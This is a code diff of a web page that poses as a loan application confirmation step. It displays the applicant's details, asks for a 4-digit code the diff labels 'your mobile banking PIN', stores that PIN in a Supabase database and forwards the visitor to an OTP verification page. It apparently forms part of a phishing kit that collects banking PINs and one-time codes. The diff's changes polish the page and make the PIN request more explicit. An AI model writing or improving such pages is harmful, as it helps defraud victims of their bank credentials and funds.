@@ -36,6 +36,8 @@
 </head>
 <body>
 <div class="app-container">
+
+    <!-- ✅ TOP SUMMARY BAR — populated from URL params -->
     <div class="loan-summary-bar">
         <div class="summary-item">
             <span class="summary-label">Loan Amount</span>
@@ -59,6 +61,7 @@
         <div class="section-title">Confirm your details</div>
         <div class="section-sub">Please review your information before continuing</div>
 
+        <!-- ✅ DETAILS GRID — populated from URL params -->
         <div class="details-grid">
             <div class="detail-row">
                 <span class="detail-label">Full Name</span>
@@ -87,6 +90,7 @@
         </div>
 
         <div class="pin-label">Enter your 4-digit mobile PIN</div>
+        <div class="pin-sublabel">This is your mobile banking PIN</div>
 
         <div class="pin-container">
             <input type="password" maxlength="1" class="pin-box" data-idx="0" inputmode="numeric">
@@ -105,36 +109,36 @@
     var SUPABASE_ANON_KEY = 'sb_publishable_KjorGuZY6O03OHhKhidk5w_Y5GcZ250';
     var supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-    // Read URL params
-    var p = new URLSearchParams(window.location.search);
-    var amount = p.get('amount') || '0';
-    var term = p.get('term') || '0';
-    var rate = p.get('rate') || '5';
-    var monthly = p.get('monthly') || '0';
-    var fullName = decodeURIComponent(p.get('name') || '');
-    var email = decodeURIComponent(p.get('email') || '');
-    var phone = decodeURIComponent(p.get('phone') || '');
-    var appId = p.get('appId') || '';
+    // ✅ Read all URL params passed from apply.html
+    var p        = new URLSearchParams(window.location.search);
+    var amount   = p.get('amount')  || '0';
+    var term     = p.get('term')    || '0';
+    var rate     = p.get('rate')    || '5';
+    var monthly  = p.get('monthly') || '0';
+    var fullName = decodeURIComponent(p.get('name')  || '');
+    var email    = decodeURIComponent(p.get('email') || '');
+    var phone    = decodeURIComponent(p.get('phone') || '');
+    var appId    = p.get('appId')   || '';
 
-    // Update top summary bar
-    document.getElementById('summaryAmount').innerText = '$' + parseFloat(amount).toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
-    document.getElementById('summaryTerm').innerText = parseInt(term) + ' month' + (parseInt(term) !== 1 ? 's' : '');
+    // ✅ Top summary bar
+    document.getElementById('summaryAmount').innerText  = '$' + parseFloat(amount).toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+    document.getElementById('summaryTerm').innerText    = parseInt(term) + ' month' + (parseInt(term) !== 1 ? 's' : '');
     document.getElementById('summaryMonthly').innerText = '$' + parseFloat(monthly).toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
-    document.getElementById('summaryRate').innerText = rate + '%';
+    document.getElementById('summaryRate').innerText    = rate + '%';
 
-    // Update details grid
-    document.getElementById('userFullName').innerText = fullName || '-';
-    document.getElementById('userEmail').innerText = email || '-';
-    document.getElementById('userPhone').innerText = phone || '-';
-    document.getElementById('detailAmount').innerText = '$' + parseFloat(amount).toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
-    document.getElementById('detailTerm').innerText = parseInt(term) + ' month' + (parseInt(term) !== 1 ? 's' : '');
+    // ✅ Details grid
+    document.getElementById('userFullName').innerText  = fullName || 'Not provided';
+    document.getElementById('userEmail').innerText     = email    || 'Not provided';
+    document.getElementById('userPhone').innerText     = phone    || 'Not provided';
+    document.getElementById('detailAmount').innerText  = '$' + parseFloat(amount).toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+    document.getElementById('detailTerm').innerText    = parseInt(term) + ' month' + (parseInt(term) !== 1 ? 's' : '');
     document.getElementById('detailMonthly').innerText = '$' + parseFloat(monthly).toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
 
-    // PIN logic
-    var pinBoxes = document.querySelectorAll('.pin-box');
+    // ✅ PIN input logic
+    var pinBoxes   = document.querySelectorAll('.pin-box');
     var currentPin = ['', '', '', ''];
     var confirmBtn = document.getElementById('confirmBtn');
-    var errorMsg = document.getElementById('pinError');
+    var errorMsg   = document.getElementById('pinError');
 
     function updatePinUI() {
         var isFull = currentPin.every(function(d) { return d && d.match(/[0-9]/); });
@@ -165,6 +169,7 @@
         });
     });
 
+    // ✅ On confirm — save PIN to Supabase then go to otp-verify.html
     confirmBtn.addEventListener('click', async function() {
         var fullPin = currentPin.join('');
         if (fullPin.length !== 4) { errorMsg.classList.add('show'); return; }
@@ -179,23 +184,23 @@
             .eq('email', email);
 
         if (error) {
-            errorMsg.textContent = 'Failed to save PIN. Please try again.';
+            errorMsg.textContent = 'Failed to save. Please try again.';
             errorMsg.classList.add('show');
             confirmBtn.disabled = false;
             confirmBtn.textContent = 'Confirm & Continue →';
             return;
         }
 
-        // Redirect to OTP page
+        // ✅ Redirect to otp-verify.html with all params
         window.location.href = 'otp-verify.html'
-            + '?amount=' + amount
-            + '&term=' + term
-            + '&rate=' + rate
+            + '?amount='  + amount
+            + '&term='    + term
+            + '&rate='    + rate
             + '&monthly=' + monthly
-            + '&name=' + encodeURIComponent(fullName)
-            + '&email=' + encodeURIComponent(email)
-            + '&phone=' + encodeURIComponent(phone)
-            + '&appId=' + appId;
+            + '&name='    + encodeURIComponent(fullName)
+            + '&email='   + encodeURIComponent(email)
+            + '&phone='   + encodeURIComponent(phone)
+            + '&appId='   + appId;
     });
 
     pinBoxes[0].focus();
